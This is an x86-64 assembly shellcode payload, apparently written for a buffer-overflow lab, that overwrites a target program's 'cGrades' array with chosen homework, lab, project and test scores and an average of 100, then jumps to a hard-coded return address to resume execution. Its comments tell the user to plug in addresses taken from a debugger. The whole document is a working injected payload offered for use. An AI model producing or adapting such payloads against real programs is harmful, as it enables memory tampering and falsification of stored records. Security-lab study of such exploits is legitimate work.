.text
.globl _start
_start:
    # Compact version - use loops to save space
    
    # Get cGrades address (REPLACE 0x404060 with your address from: p/x &cGrades)
    movabs $0x55555555bc00, %r15
    
    # Set HW grades (rows 0-8) to 6
    mov $6, %eax
    mov $0, %ecx          # counter
hw_loop:
    mov %eax, (%r15,%rcx,1)
    add $400, %ecx
    cmp $3600, %ecx
    jl hw_loop
    
    # Set Lab grades (rows 9-18) to 7
    mov $7, %eax
    mov $3600, %ecx
lab_loop:
    mov %eax, (%r15,%rcx,1)
    add $400, %ecx
    cmp $7600, %ecx
    jl lab_loop
    
    # Set Project grades (rows 19-22) to 59
    mov $59, %eax
    mov $7600, %ecx
prj_loop:
    mov %eax, (%r15,%rcx,1)
    add $400, %ecx
    cmp $9200, %ecx
    jl prj_loop
    
    # Set Test grades (rows 23-24) to 61
    mov $61, %eax
    mov %eax, 9200(%r15)
    mov %eax, 9600(%r15)
    
    # Set AVG to 100 directly (simpler than calling getAvg)
    mov $100, %eax
    mov %eax, 10000(%r15)
    
    # Return to main (REPLACE 0x4015b0 with your return address)
    movabs $0x55555555631c, %rax
    jmp *%rax

    